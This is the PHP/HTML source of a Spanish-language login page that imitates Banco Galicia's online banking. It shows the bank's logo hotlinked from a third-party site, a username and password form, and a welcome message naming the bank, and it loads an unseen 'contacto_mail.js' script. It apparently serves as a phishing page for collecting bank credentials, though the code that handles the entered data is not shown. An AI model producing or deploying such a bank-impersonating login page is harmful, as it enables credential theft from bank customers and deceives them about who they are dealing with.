<?php
$anio = date("Y");
?>
<!DOCTYPE html> 
<html  lang="es"> <!-- Idioma Español -->

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1"> <!-- Para dispositivo moviles -->
	<title>Galicia</title>
	<!-- Bootstrap css -->
	<!--<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">-->
	<link rel="stylesheet" type="text/css" href="css/bootstrap.css" >




    <!-- CSS Libreria Alertify -->
  <link type="text/css"  rel="stylesheet" href="themes/alertify.bootstrap.css" />
  <link type="text/css"  rel="stylesheet" href="themes/alertify.core.css" />
  <link type="text/css"  rel="stylesheet" href="themes/alertify.default.css" />
  <link rel="stylesheet" href="alertify-bootstrap-3/alertify.bootstrap3.css" />

<!--  <link rel="stylesheet" type="text/css" href="css/estilo.css">
  <link rel="stylesheet" type="text/css" href="css/acceso.css">  -->

  <script type='text/javascript' src="//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script> 
  <script type='text/javascript' src="js/contacto_mail.js"></script>

  <!-- Libreria Jquery de Alertify -->
  <script type="text/javascript" src="themes/alertify.js"></script>
  <script type="text/javascript" src="themes/alertify.min.js"></script>
  <script type="text/javascript" src="js/funciones.js"></script><!-- Funciones Personalizadas -->

  <!--[if lt IE 9]>
    <script src="js/html5shiv.js"></script>
    <script src="js/respond.min.js"></script>
  <![endif]-->
  
  <link rel="shortcut icon" href="img/favicon.ico">
</head>

		<style type="text/css">

		#menu-sec{background-color: white;} /* Color de fondo del menu */
		#zorro{margin-top: 10px; color:white;} /* Margen del menu negro */
		#dinamic{color: white;}
		a{color:orange;}
		.tamano_img{max-width: 1700px; max-height: 1300;}
		.txt-blanco{color: white;} .txt-naranja{color: orange;}
    .cabecera_modal_naranja{background-color: orange;}
		.txt-azul{color: blue;}

    /*
 * Specific styles of signin component
 */
/*
 * General styles
 */
body, html {
    height: 100%;
    background-repeat: no-repeat;
    /*background-image: linear-gradient(rgb(104, 145, 162), rgb(12, 97, 33));*/
    background-color: #F60;
}

.card-container.card {
    max-width: 350px;
    padding: 40px 40px;
}

.btn {
    font-weight: 700;
    height: 36px;
    -moz-user-select: none;
    -webkit-user-select: none;
    user-select: none;
    cursor: default;
}

/*
 * Card component
 */
.card {
    background-color: #F7F7F7;
    /* just in case there no content*/
    padding: 20px 25px 30px;
    margin: 0 auto 25px;
    margin-top: 50px;
    /* shadows and rounded borders */
    -moz-border-radius: 2px;
    -webkit-border-radius: 2px;
    border-radius: 2px;
    -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
    -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
    box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
}

.profile-img-card {
    width: 96px;
    height: 96px;
    margin: 0 auto 10px;
    display: block;
    -moz-border-radius: 50%;
    -webkit-border-radius: 50%;
    border-radius: 50%;
    border: solid 2px #FF0000;
}

/*
 * Form styles
 */
.profile-name-card {
    font-size: 16px;
    font-weight: bold;
    text-align: center;
    margin: 10px 0 0;
    min-height: 1em;
}

.reauth-email {
    display: block;
    color: #404040;
    line-height: 2;
    margin-bottom: 10px;
    font-size: 14px;
    text-align: center;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
    -moz-box-sizing: border-box;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
}

.form-signin #inputEmail,
.form-signin #inputPassword {
    direction: ltr;
    height: 44px;
    font-size: 16px;
}

.form-signin input[type=email],
.form-signin input[type=password],
.form-signin input[type=text],
.form-signin button {
    width: 100%;
    display: block;
    margin-bottom: 10px;
    z-index: 1;
    position: relative;
    -moz-box-sizing: border-box;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
}

.form-signin .form-control:focus {
    border-color: rgb(104, 145, 162);
    outline: 0;
    -webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,.075),0 0 8px rgb(104, 145, 162);
    box-shadow: inset 0 1px 1px rgba(0,0,0,.075),0 0 8px rgb(104, 145, 162);
}

.btn.btn-signin {
    /*background-color: #4d90fe; */
    background-color: rgb(104, 145, 162);
    /* background-color: linear-gradient(rgb(104, 145, 162), rgb(12, 97, 33));*/
    padding: 0px;
    font-weight: 700;
    font-size: 14px;
    height: 36px;
    -moz-border-radius: 3px;
    -webkit-border-radius: 3px;
    border-radius: 3px;
    border: none;
    -o-transition: all 0.218s;
    -moz-transition: all 0.218s;
    -webkit-transition: all 0.218s;
    transition: all 0.218s;
}

.btn.btn-signin:hover,
.btn.btn-signin:active,
.btn.btn-signin:focus {
    background-color: rgb(12, 97, 33);
}

.forgot-password {
    color: rgb(104, 145, 162);
}

.forgot-password:hover,
.forgot-password:active,
.forgot-password:focus{
    color: rgb(12, 97, 33);
}
		</style>


<body>



    <div class="container">
        <div class="card card-container">
            <!-- <img class="profile-img-card" src="//lh3.googleusercontent.com/-6V8xOA6M7BA/AAAAAAAAAAI/AAAAAAAAAAA/rzlHcD0KYwo/photo.jpg?sz=120" alt="" /> -->
            <img id="profile-img" class="profile-img-card" src="http://www.mensajesa.com.ar/public/images/clientes/Banco%20Galicia.png" />
            <p id="profile-name" class="profile-name-card"></p>
            <form class="form-signin" id="login">
                <span id="reauth-email" class="reauth-email"></span>

                <input type="text" id="user" name="user" class="form-control " placeholder="Usuario " required autofocus >
                <input type="password" id="pwd" name="pwd"class="form-control" placeholder="Clave de acceso" required>
                <div id="remember" class="checkbox">
                    <label>
                        <input type="checkbox" value="remember-me"> Recordarme
                    </label>
                </div>
                <button type="button" id="submit" class="btn btn-warning" data-loading-text="Verificando..." autocomplrete="off"  data-toggle="popover" data-trigger="hover" data-content="Bienvenido a Banco Galicia" >Entrar</button>
            </form><!-- /form -->
            <a href="#" class="forgot-password">
                ¿Olvidaste tu clave?
            </a>
            <br>
            <div  ><small id="sugerencia" class="alert alert-danger"> </small></div>
        </div><!-- /card-container -->
    </div><!-- /container -->


	<!-- Archivo JQuery -->
	<!--<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>-->
	<script src="js/jquery-1.12.3.min.js"></script>
	<!-- Archivo Java Script -->
	<script src="js/bootstrap.js"></script>
  <script src="/twitter-bootstrap/twitter-bootstrap-v2/js/bootstrap-modal.js"></script>  

	<!--<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>	-->





</body>

</html>


